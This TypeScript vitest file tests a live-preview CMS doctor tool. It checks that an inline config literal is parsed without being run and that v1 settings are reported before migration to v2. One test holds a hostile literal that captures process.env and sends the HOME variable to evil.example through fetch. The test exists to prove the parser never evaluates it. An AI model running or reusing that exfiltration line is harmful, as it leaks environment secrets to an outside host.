import { describe, expect, it } from 'vitest';
import { analyzeV2Readiness, readInlineConfig } from '@doctor/readiness';
import { generateInlineScript } from '@inline/generator';
import type { DoctorProbe, DoctorResponse } from '@doctor/types';

function probe(inline: string): DoctorProbe {
  const response = (body: string): DoctorResponse => ({ status: 200, headers: {}, body });
  return {
    publicResponse: response('<h1>Title</h1>'),
    previewResponse: response(
      `<script>${inline}</script><h1 data-payload-field="title">Title</h1>`,
    ),
  };
}

describe('readInlineConfig', () => {
  it('reads what the generator writes, holes and all', () => {
    const inline = generateInlineScript({
      allowedOrigins: ['https://cms.example.com'],
      skipUnchanged: true,
      sanitizerPolicy: 'strict',
    });
    const config = readInlineConfig(inline);
    expect(config?.[0]).toEqual(['https://cms.example.com']);
    expect(config?.[11]).toBeNull();
    expect(config?.[14]).toBe(true);
    expect(config?.[16]).toBe('strict');
  });

  it.each([
    ['[]', []],
    ['[,1]', [null, 1]],
    ['[1,,2]', [1, null, 2]],
    ['[1,]', [1, null]],
    ['[["a"],,,true,,]', [['a'], null, null, true, null, null]],
    ['["a,,b","]",",["]', ['a,,b', ']', ',[']],
    ['["\\"quoted\\",,"]', ['"quoted",,']],
    ['["\\u003Cscript>"]', ['<script>']],
  ])('turns %s into JSON %j', (literal, expected) => {
    expect(readInlineConfig(`var __LIVE_PREVIEW_CONFIG__=${literal};rest`)).toEqual(expected);
  });

  it('never evaluates the page: a hostile literal is unreadable, not run', () => {
    const hostile =
      'var __LIVE_PREVIEW_CONFIG__=[(globalThis.__pwned = process.env), fetch("https://evil.example/?" + process.env.HOME)];';
    expect(readInlineConfig(hostile)).toBeUndefined();
    expect((globalThis as { __pwned?: unknown }).__pwned).toBeUndefined();
    expect(analyzeV2Readiness(probe(hostile))).toEqual([
      expect.objectContaining({ code: 'LP0709', level: 'info' }),
    ]);
  });

  it('gives up on an unbalanced or non-array literal', () => {
    expect(readInlineConfig('var __LIVE_PREVIEW_CONFIG__=[1,[2];')).toBeUndefined();
    expect(readInlineConfig('var __LIVE_PREVIEW_CONFIG__={"a":1};')).toBeUndefined();
    expect(readInlineConfig('<h1>no runtime</h1>')).toBeUndefined();
  });
});

describe('analyzeV2Readiness', () => {
  it('flags every runtime row for a default (v1) configuration', () => {
    const findings = analyzeV2Readiness(
      probe(generateInlineScript({ allowedOrigins: ['https://cms.example.com'] })),
    );
    expect(findings.every((f) => f.code === 'LP0709')).toBe(true);
    expect(findings.map((f) => f.title)).toEqual(
      expect.arrayContaining([
        'Referrer trust is still on',
        'Messages are accepted from any window',
        'Sanitizer is in compat mode',
        'Unchanged bindings are re-applied every message',
      ]),
    );
  });

  it('reports nothing when the inline config already carries the v2 runtime rows', () => {
    const inline = generateInlineScript({
      allowedOrigins: ['https://cms.example.com'],
      disableReferrerDetection: true,
      eventSourcePolicy: 'parent-or-opener',
      sanitizerPolicy: 'strict',
      skipUnchanged: true,
    });
    expect(analyzeV2Readiness(probe(inline))).toEqual([]);
  });

  it('flags only the rows that are not yet flipped', () => {
    const inline = generateInlineScript({
      allowedOrigins: ['https://cms.example.com'],
      disableReferrerDetection: true,
      eventSourcePolicy: 'parent-or-opener',
    });
    expect(analyzeV2Readiness(probe(inline)).map((f) => f.title)).toEqual([
      'Sanitizer is in compat mode',
      'Unchanged bindings are re-applied every message',
    ]);
  });

  it('returns one info finding when there is no readable inline config', () => {
    const findings = analyzeV2Readiness({
      publicResponse: { status: 200, headers: {}, body: '' },
      previewResponse: { status: 200, headers: {}, body: '<h1>no runtime here</h1>' },
    });
    expect(findings).toHaveLength(1);
    expect(findings[0]?.level).toBe('info');
  });
});
